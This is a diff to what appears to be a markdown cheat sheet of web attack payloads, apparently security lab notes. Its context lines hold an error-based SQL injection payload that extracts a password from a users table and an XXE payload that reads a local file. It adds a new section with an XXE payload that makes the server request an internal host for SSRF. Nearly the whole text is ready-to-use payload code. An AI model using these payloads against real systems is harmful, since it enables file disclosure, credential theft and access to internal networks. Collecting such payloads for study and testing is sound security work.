@@ -102,3 +102,11 @@ Payload: `' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///path/to/file"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
+
+### Exploiting XXE to perform SSRF attacks
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
